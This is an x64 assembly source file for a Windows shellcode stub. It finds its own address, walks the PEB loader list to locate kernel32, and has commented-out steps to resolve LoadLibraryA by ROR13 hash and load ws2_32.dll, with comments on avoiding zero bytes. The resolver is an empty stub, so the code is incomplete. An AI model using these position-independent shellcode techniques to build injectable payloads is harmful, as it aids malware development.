;
; shLoadLibraryA-x64.asm
;
; refer to https://en.wikipedia.org/wiki/Win32_Thread_Information_Block for details
; also, TEB and PEB can be studied with expression (_TEB*)fs in Visual Studio "Watch" windows during debug.
; and moreover, some Reserved structure fields names can be obtained with pdbdump utility on MS pdbs with public symbols.
;

public shLoadLibraryA

.code

    shLoadLibraryA proc
        sub     rsp, 40                 ;// 40 bytes of shadow space: 32 for RCX, RDX, R8 and R9 registers, and 8 bytes
                                        ;// to align the stack from previous usage - the return RIP address pushed on the stack
        and     rsp, 0fffffffffffffff0h ;// Align the stack to a multiple of 16 bytes

        mov     rax, rsp                ;// 1. get the pointer to accessible memory in the stack, it will be referenced in step 3 below
        call    $+4                     ;// 2. e8 ff ff ff ff  [after this call RIP will point to the last ff byte in this instruction]
        db      030h                    ;// 3. ff 30 -> push qword ptr [rax]
        pop     rax                     ;// 4. retore stack pointer after previos instruction
        pop     rax                     ;// 5. pop the value that was pushed by call
        sub     rax, 16                 ;// 6. rax is now holding the pointer to the beginning of the shLoadLibraryA code

        mov     rbx, rax
        mov     rcx, 0 - (getKernel32Base - shLoadLibraryA)
        neg     rcx
        add     rax, rcx
        call    rax                     ;// call getKernel32Base, after the call rax = pKernel32Base

        ;mov     rdx, rbx
        ;mov     rcx, 0 - (getProcAddress - shLoadLibraryA)
        ;neg     rcx
        ;add     rdx, rcx
        ;mov     rsi, 0EC0E4E8Eh         ;// "LoadLibraryA", obtained by ROR13 hashing approach
        ;call    rdx                     ;// getProcAddress(eax - pKernel32Base, esi - hash of "LoadLibraryA" string)

        ;mov     edx, ebx
        ;mov     ecx, 0 - (dllName - shLoadLibraryA)
        ;neg     ecx
        ;add     edx, ecx
        ;push    edx                    ;// pDllName
        ;call    eax                    ;// call LoadLibraryA(dllName)

        add     rsp, 40
        ret
    shLoadLibraryA endp


    getKernel32Base proc
        push    rsi
        xor     rax, rax
        mov     rax, gs:[rax+060h]      ;// _TEB.Peb (_PEB* Peb)
        mov     rax, [rax+018h]         ;// _PEB.Ldr (_PEB_LDR_DATA* Ldr)
        mov     rsi, [rax+020h]         ;// _PEB_LDR_DATA.InLoadOrderModuleList (_LIST_ENTRY InLoadOrderModuleList)
        lodsq                           ;// _LDR_DATA_TABLE_ENTRY* of ntdll in eax
        mov     rsi, rax                ;// to avoid zeroes in code
        lodsq                           ;// _LDR_DATA_TABLE_ENTRY* of kernel32
        mov     rax, [rax+020h]         ;// _LDR_DATA_TABLE_ENTRY.DllBase
        pop	    rsi
        ret
    getKernel32Base endp


    getProcAddress proc
        ret
    getProcAddress endp


    dllName	    db "ws2_32.dll",0

end